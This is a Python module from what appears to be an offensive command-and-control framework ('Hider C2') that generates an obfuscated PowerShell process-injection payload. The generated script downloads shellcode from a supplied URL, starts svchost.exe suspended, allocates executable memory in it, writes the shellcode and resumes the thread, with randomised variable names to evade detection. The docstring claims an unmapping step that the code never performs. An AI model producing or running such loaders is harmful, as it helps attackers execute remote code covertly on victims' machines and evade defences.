"""
modules/hollow.py — Process Hollowing Template Generator (Windows)

Generates a PowerShell template for basic process hollowing:
  1. Spawn a legit process (svchost.exe) in SUSPENDED state.
  2. Unmap the original image.
  3. Write shellcode to the process base.
  4. Resume the main thread.

NOTE: This generates a TEMPLATE — actual execution requires
Win32 API access from PowerShell via P/Invoke.
"""
import random
import string

MODULE_INFO = {
    "name": "hollow",
    "description": "Process hollowing template (Windows, advanced)",
    "author": "Hider",
    "platform": "windows",
}


def _rv(n=8):
    return random.choice(string.ascii_letters) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=n-1)
    )


def run(session, args):
    """
    args[0] = URL to shellcode blob
    args[1] = (optional) target process (default: svchost.exe)
    """
    if not args or len(args) < 1:
        return "[!] Usage: hollow <shellcode_url> [target_process]"

    sc_url = args[0]
    target = args[1] if len(args) > 1 else "C:\\Windows\\System32\\svchost.exe"

    vCode = _rv(); vWC = _rv(); vSC = _rv(); vPI = _rv()
    vSI = _rv(); vCtx = _rv(); vAddr = _rv()

    return f"""
# Process Hollowing Template — Hider C2
# Target: {target}
# Shellcode: {sc_url}

$code = @"
using System;
using System.Runtime.InteropServices;
public class {vCode} {{
    [DllImport("kernel32")] public static extern bool CreateProcessA(
        string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
        uint flags, IntPtr env, string dir, byte[] si, byte[] pi);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(
        IntPtr h, IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(
        IntPtr h, IntPtr addr, byte[] buf, uint size, out IntPtr written);
    [DllImport("kernel32")] public static extern uint ResumeThread(IntPtr h);
    [DllImport("ntdll")]    public static extern int NtUnmapViewOfSection(IntPtr h, IntPtr addr);
}}
"@
Add-Type $code

# 1. Download shellcode
${vWC} = New-Object Net.WebClient
${vSC} = ${vWC}.DownloadData("{sc_url}")

# 2. Create suspended process
${vSI} = New-Object byte[] 68; ${vPI} = New-Object byte[] 16
[{vCode}]::CreateProcessA("{target}", $null, [IntPtr]::Zero, [IntPtr]::Zero,
    $false, 0x4, [IntPtr]::Zero, $null, ${vSI}, ${vPI})

# 3. Extract process handle and thread handle from PROCESS_INFORMATION
$hProcess = [BitConverter]::ToInt64(${vPI}, 0)
$hThread  = [BitConverter]::ToInt64(${vPI}, 8)

# 4. Allocate RWX memory in target
${vAddr} = [{vCode}]::VirtualAllocEx([IntPtr]$hProcess, [IntPtr]::Zero,
    [uint32]${vSC}.Length, 0x3000, 0x40)

# 5. Write shellcode
$written = [IntPtr]::Zero
[{vCode}]::WriteProcessMemory([IntPtr]$hProcess, ${vAddr}, ${vSC},
    [uint32]${vSC}.Length, [ref]$written)

# 6. Resume thread
[{vCode}]::ResumeThread([IntPtr]$hThread)

Write-Host "[+] Hollowed {target} with $(${{vSC}}.Length) bytes"
"""
